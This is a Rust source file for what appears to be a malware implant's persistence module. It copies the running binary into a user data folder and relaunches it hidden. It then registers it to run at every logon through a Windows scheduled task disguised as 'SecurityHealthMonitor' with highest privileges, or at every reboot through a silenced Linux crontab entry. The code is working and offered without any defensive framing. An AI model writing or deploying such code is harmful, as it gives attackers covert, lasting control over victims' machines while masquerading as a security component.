/// Best-effort persistence: copy to safe location, install scheduled task / cron.

pub struct PersistenceManager;

impl PersistenceManager {
    pub fn apply(require_admin: bool, copy_to_path: Option<&str>, enable_persistence: bool) {
        if require_admin {
            Self::ensure_admin();
        }

        if let Some(path) = copy_to_path {
            if !path.is_empty() {
                Self::copy_and_relaunch(path);
            }
        }

        if enable_persistence {
            Self::install_persistence();
        }
    }

    fn ensure_admin() {
        #[cfg(target_os = "windows")]
        {
            // Check if already admin
            if is_windows_admin() {
                return;
            }
            // Try relaunch as admin
            if let Ok(exe) = std::env::current_exe() {
                use std::os::windows::process::CommandExt;
                let _ = std::process::Command::new(exe)
                    .creation_flags(0x08000000)
                    .status();
            }
            std::process::exit(0);
        }
        #[cfg(not(target_os = "windows"))]
        {
            // Check if root
            let uid = unsafe { libc::getuid() };
            if uid == 0 { return; }
            eprintln!("[!] Must run as root. Exiting.");
            std::process::exit(1);
        }
    }

    fn copy_and_relaunch(relative_path: &str) {
        let current_exe = match std::env::current_exe() {
            Ok(e) => e,
            Err(_) => return,
        };

        let current_dir = current_exe.parent().unwrap_or(std::path::Path::new("."));

        #[cfg(target_os = "windows")]
        let target_dir = {
            let appdata = std::env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
            std::path::PathBuf::from(appdata).join(relative_path)
        };
        #[cfg(not(target_os = "windows"))]
        let target_dir = {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
            std::path::PathBuf::from(home).join(".local/share").join(relative_path)
        };

        // If already running from target, skip
        if current_dir.canonicalize().ok() == target_dir.canonicalize().ok() {
            return;
        }

        let target_exe = target_dir.join(current_exe.file_name().unwrap_or_default());

        if let Err(_) = std::fs::create_dir_all(&target_dir) {
            std::process::exit(0);
        }
        if std::fs::copy(&current_exe, &target_exe).is_err() {
            std::process::exit(0);
        }

        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            let _ = std::process::Command::new(&target_exe)
                .creation_flags(0x08000000)
                .spawn();
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = std::process::Command::new(&target_exe).spawn();
        }

        std::process::exit(0);
    }

    fn install_persistence() {
        #[cfg(target_os = "windows")]
        Self::install_windows_task();
        #[cfg(not(target_os = "windows"))]
        Self::install_linux_cron();
    }

    #[cfg(target_os = "windows")]
    fn install_windows_task() {
        use std::os::windows::process::CommandExt;
        let exe = match std::env::current_exe() {
            Ok(e) => e.to_string_lossy().to_string(),
            Err(_) => return,
        };
        let task_name = "SecurityHealthMonitor";
        let _ = std::process::Command::new("schtasks.exe")
            .args([
                "/create", "/tn", task_name, "/tr", &exe, "/sc", "onlogon",
                "/rl", "highest", "/f",
            ])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }

    #[cfg(not(target_os = "windows"))]
    fn install_linux_cron() {
        let exe = match std::env::current_exe() {
            Ok(e) => e.to_string_lossy().to_string(),
            Err(_) => return,
        };
        let cron_line = format!("@reboot {} >/dev/null 2>&1", exe);
        let cmd = format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_line);
        let _ = std::process::Command::new("bash")
            .args(["-c", &cmd])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
}

#[cfg(target_os = "windows")]
fn is_windows_admin() -> bool {
    // Simple check via `net session` — only works for admin
    use std::os::windows::process::CommandExt;
    std::process::Command::new("net")
        .args(["session"])
        .creation_flags(0x08000000)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}
